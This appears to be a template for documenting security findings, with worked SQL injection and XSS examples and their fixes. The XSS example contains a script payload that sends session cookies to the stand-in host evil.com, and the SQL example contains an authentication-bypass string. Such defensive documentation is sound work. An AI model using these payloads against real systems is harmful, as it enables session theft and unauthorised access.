# Security Finding Template

Use this template for documenting security vulnerabilities.

## Finding Structure

```json
{
  "id": "SEC-{number}",
  "type": "{vulnerability-type}",
  "severity": "{critical|high|medium|low}",
  "file": "{file-path}",
  "line": {line-number},
  "column": {column-number},
  "code": "{vulnerable-code-snippet}",
  "message": "{clear-description-of-issue}",
  "cwe": "CWE-{number}",
  "owasp": "A{number}:2021 - {category}",
  "recommendation": {
    "description": "{how-to-fix}",
    "fix_example": "{corrected-code}"
  },
  "references": [
    "https://...",
    "https://..."
  ]
}
```

## Markdown Template

```markdown
### 🔴 [SEC-{number}] {Vulnerability Title}

**File**: `{file-path}:{line}`
**CWE**: CWE-{number} | **OWASP**: A{number}:2021 - {category}

**Vulnerable Code**:
\`\`\`{language}
{vulnerable-code-snippet}
\`\`\`

**Issue**: {Detailed explanation of the vulnerability and potential impact}

**Attack Example** (if applicable):
\`\`\`
{example-attack-payload}
Result: {what-happens}
Effect: {security-impact}
\`\`\`

**Recommended Fix**:
\`\`\`{language}
{corrected-code-with-comments}
\`\`\`

**References**:
- [{reference-title}]({url})
- [{reference-title}]({url})

---
```

## Severity Icon Mapping

- Critical: 🔴
- High: 🟠
- Medium: 🟡
- Low: 🟢

## Example: SQL Injection Finding

```markdown
### 🔴 [SEC-001] SQL Injection in User Authentication

**File**: `src/auth/user-service.ts:145`
**CWE**: CWE-89 | **OWASP**: A03:2021 - Injection

**Vulnerable Code**:
\`\`\`typescript
const query = \`SELECT * FROM users WHERE username = '\${username}'\`;
const user = await db.execute(query);
\`\`\`

**Issue**: User input (`username`) is directly concatenated into SQL query, allowing attackers to inject malicious SQL commands and bypass authentication.

**Attack Example**:
\`\`\`
username: ' OR '1'='1' --
Result: SELECT * FROM users WHERE username = '' OR '1'='1' --'
Effect: Bypasses authentication, returns all users
\`\`\`

**Recommended Fix**:
\`\`\`typescript
// Use parameterized queries
const query = 'SELECT * FROM users WHERE username = ?';
const user = await db.execute(query, [username]);

// Or use ORM
const user = await User.findOne({ where: { username } });
\`\`\`

**References**:
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)

---
```

## Example: XSS Finding

```markdown
### 🟠 [SEC-002] Cross-Site Scripting (XSS) in Comment Rendering

**File**: `src/components/CommentList.tsx:89`
**CWE**: CWE-79 | **OWASP**: A03:2021 - Injection

**Vulnerable Code**:
\`\`\`tsx
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
\`\`\`

**Issue**: User-generated content rendered without sanitization, allowing script injection.

**Attack Example**:
\`\`\`
comment.body: "<script>fetch('evil.com/steal?cookie='+document.cookie)</script>"
Effect: Steals user session cookies
\`\`\`

**Recommended Fix**:
\`\`\`tsx
import DOMPurify from 'dompurify';

// Sanitize HTML before rendering
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(comment.body) 
}} />

// Or use text content (if HTML not needed)
<div>{comment.body}</div>
\`\`\`

**References**:
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)

---
```

## Compliance Mapping Template

When finding affects compliance:

```markdown
**Compliance Impact**:
- **PCI DSS**: Requirement 6.5.1 (Injection flaws)
- **HIPAA**: Technical Safeguards - Access Control
- **GDPR**: Article 32 (Security of processing)
```
